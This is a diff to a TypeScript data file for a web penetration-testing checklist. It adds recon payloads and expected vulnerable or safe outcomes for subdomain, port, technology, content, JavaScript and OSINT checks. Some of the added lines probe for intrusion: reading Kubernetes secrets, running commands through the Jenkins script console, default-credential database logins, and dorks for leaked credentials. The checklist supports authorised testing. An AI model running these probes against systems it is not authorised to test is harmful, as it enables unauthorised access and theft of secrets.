@@ -18,6 +18,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Passive subdomain enumeration with subfinder",
         how: "Run subfinder against the root domain to collect subdomains from passive sources (no direct requests to target).",
         payloads: ["subfinder -d example.com -all -o subs.txt"],
+        expectedResponse: {
+          vulnerable: "subfinder returns a list of live-looking subdomains, several of which resolve and expose forgotten apps, staging panels, or old infrastructure.",
+          safe: "subfinder returns only the well-known, already-documented subdomains and nothing unexpected or sensitive is newly exposed.",
+        },
         severity: "info",
         tags: { relatedItemIds: ["web-recon-port-1"] },
       },
@@ -26,6 +30,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Query crt.sh certificate transparency logs",
         how: "Search crt.sh for the domain to find subdomains issued via public TLS certs, including forgotten/staging hosts.",
         payloads: ["https://crt.sh/?q=%25.example.com&output=json"],
+        expectedResponse: {
+          vulnerable: "crt.sh returns certificate entries for internal, staging, or dev hostnames that were never intended to be public.",
+          safe: "crt.sh only shows certificates for the organization's known, already-public hostnames.",
+        },
         severity: "info",
       },
       {
@@ -33,6 +41,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Brute-force subdomains with a wordlist",
         how: "Use a resolver (puredns/shuffledns) with a large wordlist to find subdomains not in passive sources.",
         payloads: ["puredns bruteforce wordlist.txt example.com -r resolvers.txt"],
+        expectedResponse: {
+          vulnerable: "The brute-force wordlist resolves additional subdomains not found via passive sources, some hosting exposed or unauthenticated services.",
+          safe: "No new subdomains resolve beyond the known set, or newly found hosts require proper authentication and show no sensitive content.",
+        },
         severity: "info",
       },
       {
@@ -40,6 +52,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Permutation scan on known subdomains",
         how: "Generate permutations (dev-, staging-, api-v2-) of already-found subdomains and resolve them; catches internal naming patterns.",
         payloads: ["alterx -l subs.txt | dnsx -silent"],
+        expectedResponse: {
+          vulnerable: "Permutations like dev-, staging-, api-v2- resolve to live hosts revealing internal naming conventions and pre-production environments.",
+          safe: "Generated permutations fail to resolve or all resolve to the same hardened production infrastructure with no extra exposure.",
+        },
         severity: "info",
       },
       {
@@ -47,18 +63,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check for subdomain takeover on dangling CNAMEs",
         how: "For each subdomain pointing to an unclaimed cloud service (S3, Heroku, GitHub Pages), verify with subzy/nuclei if it can be claimed.",
         payloads: ["subzy run --targets subs.txt"],
+        expectedResponse: {
+          vulnerable: "subzy/nuclei reports the CNAME points to an unclaimed cloud resource (e.g. \"NoSuchBucket\", \"There isn't a GitHub Pages site here\"), meaning the subdomain can be claimed and content served under the target's domain.",
+          safe: "The CNAME target resolves to an actively-owned resource or the DNS record has been removed, so the takeover check returns not vulnerable.",
+        },
         severity: "high",
       },
       {
         id: "web-recon-sub-6",
         text: "Enumerate via reverse WHOIS on org name",
         how: "Search reverse WHOIS/ASN records for other domains registered by the same organization to expand scope legitimately.",
+        payloads: ["https://whoxy.com/reverse-whois?keyword=Example+Inc", "amass intel -org 'Example Inc'"],
+        expectedResponse: {
+          vulnerable: "Reverse WHOIS/ASN lookups reveal additional, previously-unknown domains owned by the same org that are in scope and less hardened.",
+          safe: "No additional domains are found, or all discovered domains are already known and equally well-secured.",
+        },
         severity: "info",
       },
       {
         id: "web-recon-sub-7",
         text: "Check Certificate Transparency for wildcard cert subdomains",
         how: "Look specifically for wildcard SANs in issued certs, which may reveal an internal naming convention.",
+        payloads: ["https://crt.sh/?q=%25.example.com&output=json | jq -r '.[].name_value' | sort -u"],
+        expectedResponse: {
+          vulnerable: "Wildcard SAN entries in issued certificates reveal an internal naming convention that helps predict unlisted subdomains.",
+          safe: "Certificates use unique, non-predictable SANs with no wildcard entries leaking naming patterns.",
+        },
         severity: "info",
       },
       {
@@ -66,18 +96,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Resolve all found subdomains and filter live hosts",
         how: "Mass-resolve the subdomain list and probe with httpx to keep only responsive HTTP(S) hosts for further testing.",
         payloads: ["httpx -l subs.txt -silent -status-code -title"],
+        expectedResponse: {
+          vulnerable: "httpx shows a large number of live HTTP(S) hosts, including ones with unusual titles/status codes suggesting misconfigured or forgotten apps.",
+          safe: "Only expected, hardened hosts respond, all returning consistent, non-revealing titles and status codes.",
+        },
         severity: "info",
       },
       {
         id: "web-recon-sub-9",
         text: "Check for internal/dev subdomains exposed publicly",
         how: "Look for dev./staging./uat./test. subdomains that may run debug builds with weaker security controls.",
+        payloads: ["dev.example.com", "staging.example.com", "uat.example.com", "test.example.com"],
+        expectedResponse: {
+          vulnerable: "A dev./staging./uat./test. subdomain resolves and is reachable, often running a debug build with verbose errors or weaker auth.",
+          safe: "Dev/staging subdomains are not publicly resolvable, or if reachable they require authentication and behave identically to production.",
+        },
         severity: "medium",
       },
       {
         id: "web-recon-sub-10",
         text: "Enumerate subdomains via GitHub/GitLab code search",
         how: "Search public code repos for references to internal subdomains leaked in configs, CI files, or old commits.",
+        payloads: ["github-subdomains -d example.com -t <github_token>", "site:github.com \"example.com\" \"internal\""],
+        expectedResponse: {
+          vulnerable: "GitHub/GitLab code search surfaces commits or config files referencing internal subdomains, tokens, or infrastructure names.",
+          safe: "No code search results reference the target's internal subdomains or secrets.",
+        },
         severity: "medium",
       },
     ],
@@ -93,6 +137,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Full TCP SYN scan on all 65535 ports",
         how: "Scan every port for open services — apps often expose admin panels or debug ports beyond 80/443.",
         payloads: ["nmap -p- -sS -T4 example.com"],
+        expectedResponse: {
+          vulnerable: "nmap reveals services listening on unexpected ports (e.g. admin panels, debug consoles, databases) beyond 80/443.",
+          safe: "Only 80/443 (and other explicitly sanctioned ports) are open; nmap shows all other ports closed or filtered.",
+        },
         severity: "info",
       },
       {
@@ -100,6 +148,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check for unauthenticated Redis on port 6379",
         how: "Connect directly and run an INFO command; unauthenticated Redis allows full data read/write and RCE via module loading.",
         payloads: ["redis-cli -h <ip> -p 6379 INFO"],
+        expectedResponse: {
+          vulnerable: "The INFO command returns Redis server data without authentication, confirming unauthenticated read/write and potential RCE via module loading.",
+          safe: "The connection is refused or Redis returns a NOAUTH Authentication required error, confirming access is protected.",
+        },
         severity: "critical",
       },
       {
@@ -107,12 +159,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check for exposed Elasticsearch/Kibana",
         how: "Hit port 9200/5601 directly; unauthenticated instances leak full indexed data and allow query execution.",
         payloads: ["curl http://<ip>:9200/_cat/indices"],
+        expectedResponse: {
+          vulnerable: "The Elasticsearch/Kibana endpoint returns indices/data without credentials, confirming unauthenticated full data access.",
+          safe: "The request returns 401/403 or connection refused, confirming authentication is enforced.",
+        },
         severity: "critical",
       },
       {
         id: "web-recon-port-4",
         text: "Check for exposed database ports (MySQL 3306, Postgres 5432, MongoDB 27017)",
         how: "Attempt anonymous/default-credential connections to any exposed DB port found in the scan.",
+        payloads: ["mysql -h <ip> -u root -p", "psql -h <ip> -U postgres", "mongo <ip>:27017 --eval 'db.adminCommand(\"listDatabases\")'"],
+        expectedResponse: {
+          vulnerable: "A default-credential or anonymous connection succeeds and returns database/collection listings.",
+          safe: "All connection attempts are rejected with authentication errors; no anonymous or default-credential access is possible.",
+        },
         severity: "critical",
       },
       {
@@ -120,12 +181,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Run service version detection on open ports",
         how: "Identify exact service versions to cross-reference against known CVEs.",
         payloads: ["nmap -sV -p <ports> example.com"],
+        expectedResponse: {
+          vulnerable: "Version detection identifies outdated service versions with known public CVEs.",
+          safe: "Detected service versions are current and patched, with no known unpatched CVEs.",
+        },
         severity: "info",
       },
       {
         id: "web-recon-port-6",
         text: "Check for exposed Jenkins/CI servers",
         how: "Look for Jenkins on common ports (8080) with anonymous access enabled, which allows script console RCE.",
+        payloads: ["curl http://<ip>:8080/script", "println \"id\".execute().text"],
+        expectedResponse: {
+          vulnerable: "An exposed Jenkins instance is reachable and allows unauthenticated access to jobs, scripts, or the Script Console (leading to RCE).",
+          safe: "Jenkins requires authentication for all endpoints and the Script Console is inaccessible without valid credentials.",
+        },
         severity: "critical",
       },
       {
@@ -133,12 +203,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check for exposed Docker API (port 2375/2376)",
         how: "An unauthenticated Docker daemon API allows container creation with host filesystem mounts — full host compromise.",
         payloads: ["curl http://<ip>:2375/version"],
+        expectedResponse: {
+          vulnerable: "The Docker API responds to unauthenticated requests (e.g. /containers/json), allowing container listing/creation and host compromise.",
+          safe: "The Docker API port is closed, firewalled, or requires TLS client-certificate authentication.",
+        },
         severity: "critical",
       },
       {
         id: "web-recon-port-8",
         text: "Check for exposed Kubernetes API/dashboard",
         how: "Look for the Kubernetes API server (6443) or dashboard exposed without auth, revealing cluster secrets and workloads.",
+        payloads: ["curl -k https://<ip>:6443/api/v1/namespaces/kube-system/secrets", "curl http://<ip>:8001/api/v1/namespaces"],
+        expectedResponse: {
+          vulnerable: "The Kubernetes API/dashboard responds without authentication, exposing cluster resources or allowing pod creation.",
+          safe: "The API/dashboard requires a valid bearer token/cert and anonymous requests are rejected with 401/403.",
+        },
         severity: "critical",
       },
       {
@@ -146,6 +225,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Banner-grab non-HTTP services for misconfig clues",
         how: "Connect directly to unusual open ports and read service banners for version/config hints.",
         payloads: ["nc -nv <ip> <port>"],
+        expectedResponse: {
+          vulnerable: "Banner grabbing reveals verbose service/version strings or misconfiguration clues (default banners, debug info).",
+          safe: "Banners are suppressed or generic, revealing no version or configuration details.",
+        },
         severity: "info",
       },
       {
@@ -153,6 +236,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check for FTP with anonymous login",
         how: "Attempt anonymous FTP login on port 21; often overlooked and can leak/allow upload of files.",
         payloads: ["ftp <ip>  # login: anonymous / anonymous"],
+        expectedResponse: {
+          vulnerable: "FTP accepts the \"anonymous\" username with any/blank password and lists directory contents.",
+          safe: "FTP rejects the anonymous login attempt or the service is not running.",
+        },
         severity: "medium",
       },
     ],
@@ -167,6 +254,11 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-recon-tech-1",
         text: "Identify stack with Wappalyzer",
         how: "Use the browser extension or wappalyzer CLI to identify frameworks/CMS/libraries — this drives which tech-specific checks apply later.",
+        payloads: ["wappalyzer https://example.com"],
+        expectedResponse: {
+          vulnerable: "Wappalyzer identifies specific framework/library/CMS versions, some of which are outdated and map to known CVEs.",
+          safe: "Wappalyzer identifies only current, patched components or fails to fingerprint specifics due to good header/asset hygiene.",
+        },
         severity: "info",
       },
       {
@@ -174,12 +266,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check X-Powered-By and Server headers",
         how: "Inspect response headers for backend technology and version disclosure.",
         payloads: ["curl -I https://example.com"],
+        expectedResponse: {
+          vulnerable: "X-Powered-By/Server headers leak exact software and version (e.g. \"PHP/7.2.1\", \"Apache/2.4.6\"), aiding exploit selection.",
+          safe: "These headers are stripped or genericized, revealing no exploitable version information.",
+        },
         severity: "info",
       },
       {
         id: "web-recon-tech-3",
         text: "Fingerprint CMS via known file paths",
         how: "Check for CMS-specific paths (/wp-login.php, /administrator, /sites/default) to identify WordPress/Joomla/Drupal.",
+        payloads: ["curl -s -o /dev/null -w '%{http_code}' https://example.com/wp-login.php", "curl -s https://example.com/administrator/", "whatweb https://example.com"],
+        expectedResponse: {
+          vulnerable: "Known CMS file paths (e.g. /wp-login.php, /administrator) resolve successfully, confirming the CMS and its version via meta tags/readme files.",
+          safe: "None of the known CMS paths resolve, or version-revealing files (readme, changelog) are removed/blocked.",
+        },
         severity: "info",
       },
       {
@@ -187,6 +288,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Identify WAF/CDN in front of the target",
         how: "Use wafw00f or response fingerprints to detect Cloudflare/Akamai/Imperva — informs which bypass techniques may be needed later.",
         payloads: ["wafw00f https://example.com"],
+        expectedResponse: {
+          vulnerable: "Response headers/IP ranges show no WAF/CDN in front of the origin, meaning attacks reach the app directly with no filtering layer.",
+          safe: "A WAF/CDN (Cloudflare, Akamai, etc.) is clearly identified in front of the origin, adding a filtering layer to bypass.",
+        },
         severity: "info",
       },
       {
@@ -194,24 +299,43 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check for exposed version control folders",
         how: "Request /.git/HEAD or /.svn/entries directly — if accessible, the full source history can be downloaded.",
         payloads: ["curl https://example.com/.git/HEAD"],
+        expectedResponse: {
+          vulnerable: "A request to /.git/ or /.svn/ returns actual repository files, allowing full source code reconstruction.",
+          safe: "Version control paths return 403/404 and no repository metadata or objects are retrievable.",
+        },
         severity: "high",
       },
       {
         id: "web-recon-tech-6",
         text: "Identify server software via error pages",
         how: "Trigger a 404/500 and inspect the default error page template, which often reveals Nginx/Apache/IIS and version.",
+        payloads: ["curl -i https://example.com/%00", "curl -i https://example.com/this-page-does-not-exist-1234"],
+        expectedResponse: {
+          vulnerable: "Triggered error pages reveal the exact server software/version/stack trace in default error templates.",
+          safe: "Error pages are custom and generic, revealing no server software, version, or path information.",
+        },
         severity: "info",
       },
       {
         id: "web-recon-tech-7",
         text: "Check for known vulnerable JS library versions",
         how: "Enumerate loaded JS libraries and versions (jQuery, Lodash, etc.) and check against known CVE databases.",
+        payloads: ["retire --url https://example.com", "nuclei -u https://example.com -t exposed-panels/js-library-detect.yaml"],
+        expectedResponse: {
+          vulnerable: "Identified JS libraries have known versions with public XSS/prototype-pollution CVEs (e.g. old jQuery, Angular).",
+          safe: "All identified JS libraries are current, patched versions with no known applicable CVEs.",
+        },
         severity: "medium",
       },
       {
         id: "web-recon-tech-8",
         text: "Detect load balancer / multiple backend hosts",
         how: "Send repeated requests and compare response headers/timing to detect if requests are served by different backend instances (relevant for race conditions and cache attacks).",
+        payloads: ["for i in {1..10}; do curl -s -D - -o /dev/null https://example.com | grep -i 'x-served-by\\|date'; done"],
+        expectedResponse: {
+          vulnerable: "Response headers/timing/SSL cert differences reveal multiple distinct backend hosts behind a load balancer, useful for targeting inconsistent patch levels.",
+          safe: "All responses are consistent regardless of repeated requests, showing a uniformly patched backend fleet or no useful inconsistency.",
+        },
         severity: "info",
       },
     ],
@@ -227,6 +351,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check robots.txt for disallowed paths",
         how: "Fetch /robots.txt and review disallowed entries — they often point to admin/internal paths.",
         payloads: ["curl https://example.com/robots.txt"],
+        expectedResponse: {
+          vulnerable: "robots.txt lists Disallow paths that lead to sensitive admin, backup, or internal functionality when visited directly.",
+          safe: "robots.txt lists only non-sensitive paths, or disallowed paths still enforce proper authentication/authorization when visited.",
+        },
         severity: "low",
       },
       {
@@ -234,6 +362,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Look for backup files",
         how: "Fuzz common backup extensions on discovered files/paths; backups often leak source code or credentials.",
         payloads: [".bak", ".old", ".orig", ".save", ".swp", ".tmp"],
+        expectedResponse: {
+          vulnerable: "A backup file (e.g. .bak, .zip, .sql, ~) is retrievable and contains source code, credentials, or a database dump.",
+          safe: "No backup files are found at common paths, or existing ones return 403/404.",
+        },
         severity: "high",
       },
       {
@@ -241,6 +373,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Directory/content discovery with ffuf",
         how: "Fuzz for hidden directories and files using a curated wordlist against the target.",
         payloads: ["ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 200,301,302,403"],
+        expectedResponse: {
+          vulnerable: "ffuf discovers hidden directories/files (admin panels, debug tools, backups) returning 200 that were not linked anywhere.",
+          safe: "ffuf finds no meaningful hidden content beyond expected, already-linked pages.",
+        },
         severity: "info",
       },
       {
@@ -248,6 +384,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check sitemap.xml for hidden/unlinked pages",
         how: "Fetch /sitemap.xml and review for pages not linked in normal navigation.",
         payloads: ["curl https://example.com/sitemap.xml"],
+        expectedResponse: {
+          vulnerable: "sitemap.xml lists unlinked pages/endpoints (e.g. staging, admin, or draft content) accessible without authentication.",
+          safe: "sitemap.xml contains only intentionally public, already-known URLs.",
+        },
         severity: "info",
       },
       {
@@ -255,6 +395,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Look for exposed config/env files",
         how: "Fuzz for common config file names that leak secrets if misdeployed to the web root.",
         payloads: [".env", "config.php.bak", "web.config", "appsettings.json"],
+        expectedResponse: {
+          vulnerable: "A config/env file (e.g. .env, config.php.bak) is downloadable and contains database credentials, API keys, or secrets.",
+          safe: "Config/env file paths return 403/404 and no secrets are exposed.",
+        },
         severity: "critical",
       },
       {
@@ -262,18 +406,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check for exposed API documentation (Swagger/OpenAPI)",
         how: "Look for /swagger.json, /api-docs, /openapi.yaml which reveal the full internal API surface.",
         payloads: ["/swagger-ui.html", "/v2/api-docs", "/openapi.json"],
+        expectedResponse: {
+          vulnerable: "Swagger/OpenAPI JSON is publicly reachable, exposing full internal API surface including undocumented/admin endpoints.",
+          safe: "API documentation requires authentication or is not exposed publicly, revealing no internal endpoint map.",
+        },
         severity: "medium",
       },
       {
         id: "web-recon-content-7",
         text: "Check for directory listing enabled",
         how: "Request a directory path directly (no index file) and check whether the server returns a file listing.",
+        payloads: ["curl https://example.com/uploads/", "curl https://example.com/assets/images/"],
+        expectedResponse: {
+          vulnerable: "Requesting a directory path returns an auto-generated file listing exposing filenames not otherwise linked.",
+          safe: "Directory requests return 403 Forbidden or a custom index page with no raw file listing.",
+        },
         severity: "medium",
       },
       {
         id: "web-recon-content-8",
         text: "Discover admin/staff login panels",
         how: "Fuzz for common admin panel paths (/admin, /manage, /cpanel, /staff-login) which may have weaker protections.",
+        payloads: ["ffuf -u https://example.com/FUZZ -w admin-panels.txt -mc 200,301,302,401,403"],
+        expectedResponse: {
+          vulnerable: "Admin/staff login panels are discoverable at guessable or fuzzed paths and are reachable without IP restriction.",
+          safe: "No admin/staff login panel is reachable from the public internet, or discovery attempts are blocked/require VPN.",
+        },
         severity: "medium",
       },
       {
@@ -281,12 +439,21 @@ export const webCategories: ChecklistCategory[] = [
         text: "Check web archive (Wayback Machine) for old/removed endpoints",
         how: "Query the Wayback Machine CDX API for historical URLs that may still be live but unlinked.",
         payloads: ["curl 'http://web.archive.org/cdx/search/cdx?url=example.com/*&output=text'"],
+        expectedResponse: {
+          vulnerable: "The Wayback Machine reveals old/removed endpoints that still function and lack current security controls.",
+          safe: "Archived endpoints from Wayback Machine are gone (404) or behave identically to current, secured endpoints.",
+        },
         severity: "info",
       },
       {
         id: "web-recon-content-10",
         text: "Fuzz for exposed CI/CD and deployment files",
         how: "Check for .github/workflows, Dockerfile, docker-compose.yml, Jenkinsfile accidentally deployed to the web root.",
+        payloads: ["curl https://example.com/Dockerfile", "curl https://example.com/docker-compose.yml", "curl https://example.com/Jenkinsfile"],
+        expectedResponse: {
+          vulnerable: "Fuzzing uncovers exposed CI/CD files (e.g. .travis.yml, Jenkinsfile, .gitlab-ci.yml, docker-compose.yml) revealing pipeline secrets or infra details.",
+          safe: "No CI/CD or deployment files are exposed; requests for common paths return 403/404.",
+        },
         severity: "high",
       },
     ],
@@ -302,6 +469,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Crawl the site for URLs and parameters with katana",
         how: "Run a comprehensive crawl to build a full URL + parameter inventory before fuzzing begins.",
         payloads: ["katana -u https://example.com -d 3 -jc -o urls.txt"],
+        expectedResponse: {
+          vulnerable: "katana's crawl surfaces a large set of URLs/parameters, including undocumented endpoints worth targeted testing.",
+          safe: "The crawl returns only a small, already-known set of URLs with no new attack surface.",
+        },
         severity: "info",
       },
       {
@@ -309,6 +480,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Collect historical parameters via Wayback/GAU",
         how: "Pull archived URLs with query parameters that may still be accepted by current endpoints.",
         payloads: ["gau example.com | grep '='"],
+        expectedResponse: {
+          vulnerable: "Wayback/GAU reveal historical parameters (e.g. old debug or admin params) still accepted by the current application.",
+          safe: "Historical parameters are no longer accepted, or the endpoints referencing them have been removed.",
+        },
         severity: "info",
       },
       {
@@ -316,6 +491,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Fuzz for hidden/undocumented parameters",
         how: "Use arjun/paramspider against known endpoints to discover parameters not visible in the UI.",
         payloads: ["arjun -u https://example.com/endpoint"],
+        expectedResponse: {
+          vulnerable: "Fuzzing reveals hidden parameters (e.g. \"admin=true\", \"debug=1\") that change application behavior when supplied.",
+          safe: "Fuzzed parameter names have no effect on application behavior, indicating no hidden functionality is parameter-gated.",
+        },
         severity: "info",
       },
       {
@@ -323,30 +502,54 @@ export const webCategories: ChecklistCategory[] = [
         text: "Identify debug/internal parameters (debug=1, test=true)",
         how: "Try common debug-flag parameter names on every endpoint; some expose verbose output or bypass checks.",
         payloads: ["?debug=true", "?test=1", "?admin=1"],
+        expectedResponse: {
+          vulnerable: "Supplying debug=1/test=true unlocks verbose output, stack traces, or bypasses checks not present in normal requests.",
+          safe: "Debug/test parameters are ignored in production and produce no behavioral change.",
+        },
         severity: "medium",
       },
       {
         id: "web-recon-params-5",
         text: "Map all API endpoints referenced in mobile app / JS bundle",
         how: "Cross-reference endpoints found in the mobile app binary or JS bundle against what's reachable from the web app.",
+        payloads: ["apktool d app.apk -o app_src && grep -rEo 'https?://[a-zA-Z0-9./_-]+' app_src/"],
+        expectedResponse: {
+          vulnerable: "The mobile app/JS bundle references internal or undocumented API endpoints that are reachable and lack the same access controls as public ones.",
+          safe: "Referenced endpoints match the documented public API and enforce identical access controls.",
+        },
         severity: "info",
       },
       {
         id: "web-recon-params-6",
         text: "Diff authenticated vs unauthenticated crawl results",
         how: "Crawl once as anonymous and once as a logged-in user; endpoints only visible when authenticated highlight the access-controlled surface.",
+        payloads: ["katana -u https://example.com -o anon.txt", "katana -u https://example.com -H 'Cookie: session=<token>' -o auth.txt", "diff <(sort anon.txt) <(sort auth.txt)"],
+        expectedResponse: {
+          vulnerable: "Diffing crawls shows authenticated-only endpoints/data also reachable without authentication.",
+          safe: "Endpoints found in the authenticated crawl consistently require authentication when accessed unauthenticated.",
+        },
         severity: "info",
       },
       {
         id: "web-recon-params-7",
         text: "Extract GraphQL/REST routes from client-side router config",
         how: "Inspect SPA router definitions (React Router, Vue Router) bundled in JS for routes not linked in the visible UI.",
+        payloads: ["grep -Eo '(path|to):\\s*[\"'\\''][a-zA-Z0-9/_:-]+[\"'\\'']' main.bundle.js"],
+        expectedResponse: {
+          vulnerable: "Client-side router config reveals GraphQL/REST routes not present in official documentation, expanding the attack surface.",
+          safe: "All routes in the client-side router match documented, already-tested endpoints.",
+        },
         severity: "info",
       },
       {
         id: "web-recon-params-8",
         text: "Build a full parameter wordlist per endpoint for fuzzing",
         how: "Consolidate all discovered parameter names into a per-endpoint list to drive later injection testing.",
+        payloads: ["cat arjun_out.json gau_params.txt | jq -r 'keys[]?' | sort -u > params.txt"],
+        expectedResponse: {
+          vulnerable: "The compiled per-endpoint wordlist surfaces new parameters that trigger different responses/errors worth further testing.",
+          safe: "No new parameters produce a different response from the endpoint's baseline behavior.",
+        },
         severity: "info",
       },
     ],
@@ -362,6 +565,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Extract API endpoints from JS files",
         how: "Download all loaded JS bundles and grep for endpoint patterns, hidden routes, and hardcoded secrets.",
         payloads: ["katana -u https://example.com -jc | grep -Eo '\"/[a-zA-Z0-9_/-]+\"'"],
+        expectedResponse: {
+          vulnerable: "JS files reference internal/admin API endpoints not documented or linked from the UI.",
+          safe: "JS files reference only the same public endpoints already documented, with no internal surface exposed.",
+        },
         severity: "medium",
       },
       {
@@ -369,6 +576,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Search for hardcoded API keys/secrets in JS",
         how: "Scan bundled JS for AWS keys, API tokens, or internal URLs left in client-side code.",
         payloads: ["truffleHog filesystem ./downloaded_js/"],
+        expectedResponse: {
+          vulnerable: "A hardcoded API key, access token, or secret is found in plaintext inside a JS bundle.",
+          safe: "No hardcoded secrets are present; API keys are fetched server-side or scoped to the client with no sensitive privileges.",
+        },
         severity: "high",
       },
       {
@@ -376,18 +587,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Analyze source maps if exposed",
         how: "Check for .js.map files that reveal the full unminified original source, including comments and internal logic.",
         payloads: ["curl https://example.com/static/app.js.map"],
+        expectedResponse: {
+          vulnerable: "Exposed source maps (.map files) reveal original, unminified source code including comments and internal logic.",
+          safe: "Source maps are absent in production or return 403/404.",
+        },
         severity: "medium",
       },
       {
         id: "web-recon-js-4",
         text: "Look for hidden/disabled feature flags in JS",
         how: "Search for feature-flag objects or config constants that may unlock in-progress or admin-only functionality client-side.",
+        payloads: ["grep -Eo '\"(featureFlags|flags|experiments)\"\\s*:\\s*\\{[^}]*\\}' app.js"],
+        expectedResponse: {
+          vulnerable: "Disabled feature flags in the JS bundle can be flipped client-side to reveal or enable hidden functionality.",
+          safe: "Feature flags are enforced server-side; toggling them client-side has no effect on what the server allows.",
+        },
         severity: "medium",
       },
       {
         id: "web-recon-js-5",
         text: "Check for client-side authorization logic (security by obscurity)",
         how: "Look for role/permission checks done only in JS (e.g. hiding an admin button), which can be bypassed by calling the API directly.",
+        payloads: ["grep -n \"role ===\\|isAdmin\\|hasPermission\" app.js", "curl -b 'session=<low_priv_token>' https://example.com/api/admin/action  # button hidden but API still reachable"],
+        expectedResponse: {
+          vulnerable: "Authorization decisions (e.g. hiding an \"Admin\" button) are made only in client-side JS, and the underlying API still allows the action when called directly.",
+          safe: "The server independently re-validates authorization on every request regardless of what the UI shows or hides.",
+        },
         severity: "high",
         tags: { relatedItemIds: ["web-access-priv-1"] },
       },
@@ -395,18 +620,33 @@ export const webCategories: ChecklistCategory[] = [
         id: "web-recon-js-6",
         text: "Review WebPack chunk names for unlinked routes",
         how: "Enumerate dynamically-loaded chunk filenames to discover routes/features not reachable from the current UI state.",
+        payloads: ["grep -Eo '[0-9a-f]{8,20}\\.chunk\\.js' index.html main.js", "curl -s https://example.com/static/js/admin.a1b2c3d4.chunk.js"],
+        expectedResponse: {
+          vulnerable: "Webpack chunk names reveal unlinked routes/features (e.g. \"admin-panel.chunk.js\") that are reachable directly.",
+          safe: "Chunk names are generic/hashed and reveal no unlinked route names, or referenced routes are properly access-controlled.",
+        },
         severity: "low",
       },
       {
         id: "web-recon-js-7",
         text: "Check for internal comments/TODOs revealing bugs",
         how: "Grep JS/HTML source comments for TODO/FIXME/HACK notes that may hint at known weaknesses.",
+        payloads: ["grep -rniE 'TODO|FIXME|HACK|XXX|password|secret' ./downloaded_js/"],
+        expectedResponse: {
+          vulnerable: "Comments/TODOs in shipped JS reveal known bugs, temporary workarounds, or internal endpoint names useful for further attacks.",
+          safe: "No revealing comments or TODOs are present in shipped code.",
+        },
         severity: "low",
       },
       {
         id: "web-recon-js-8",
         text: "Analyze service workers for cached sensitive data",
         how: "Inspect registered service worker scripts and cache storage for sensitive API responses cached client-side.",
+        payloads: ["curl https://example.com/service-worker.js", "// DevTools: Application > Cache Storage > inspect cached API responses"],
+        expectedResponse: {
+          vulnerable: "The service worker cache stores sensitive API responses (tokens, PII) retrievable via DevTools Application storage.",
+          safe: "The service worker excludes sensitive/authenticated responses from its cache, or no sensitive data persists in cache storage.",
+        },
         severity: "medium",
       },
     ],
@@ -422,6 +662,10 @@ export const webCategories: ChecklistCategory[] = [
         text: "Search for exposed documents on the domain",
         how: "Use filetype dorks to find leaked PDFs/spreadsheets/docs indexed by Google that may contain internal data.",
         payloads: ["site:example.com filetype:pdf", "site:example.com filetype:xlsx"],
+        expectedResponse: {
+          vulnerable: "Search engines index sensitive documents (PDFs, spreadsheets) hosted on the domain containing internal data.",
+          safe: "No sensitive documents are indexed for the domain.",
+        },
         severity: "medium",
       },
       {
@@ -429,18 +673,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Search for exposed .env/config files indexed by search engines",
         how: "Dork for common secret-bearing filenames that got indexed despite not being linked.",
         payloads: ["site:example.com filetype:env", "site:example.com inurl:config"],
+        expectedResponse: {
+          vulnerable: "Search engine dorks (e.g. \"filetype:env\") return cached .env/config files with live credentials.",
+          safe: "No .env/config files are indexed by search engines for this domain.",
+        },
         severity: "high",
       },
       {
         id: "web-recon-osint-3",
         text: "Search code-sharing sites for leaked credentials",
         how: "Search GitHub/GitLab/Pastebin for the company/domain name alongside common secret patterns (API_KEY, password, token).",
+        payloads: ["\"example.com\" \"API_KEY\" site:github.com", "\"example.com\" password site:pastebin.com", "gitleaks detect --source . -v"],
+        expectedResponse: {
+          vulnerable: "Code-sharing sites (Pastebin, GitHub gists) contain leaked credentials or tokens tied to the target.",
+          safe: "No leaked credentials for the target are found on code-sharing sites.",
+        },
         severity: "high",
       },
       {
         id: "web-recon-osint-4",
         text: "Check employee LinkedIn/GitHub for tech stack clues and internal tool names",
         how: "OSINT on public employee profiles to learn internal tool names, which can guide targeted recon.",
+        payloads: ["site:linkedin.com \"example.com\" \"software engineer\"", "site:github.com \"@example.com\" in:email"],
+        expectedResponse: {
+          vulnerable: "Employee LinkedIn/GitHub profiles reveal internal tool names, tech stack, or org structure useful for social engineering or targeted exploits.",
+          safe: "Employee profiles reveal no internal tooling or stack details beyond generic public information.",
+        },
         severity: "info",
       },
       {
@@ -448,18 +706,32 @@ export const webCategories: ChecklistCategory[] = [
         text: "Search for exposed error/log files indexed publicly",
         how: "Dork for common log file extensions/paths that may have been accidentally crawled and indexed.",
         payloads: ["site:example.com filetype:log"],
+        expectedResponse: {
+          vulnerable: "Search engines index exposed error/log files revealing stack traces, paths, or credentials.",
+          safe: "No error/log files are indexed publicly.",
+        },
         severity: "medium",
       },
       {
         id: "web-recon-osint-6",
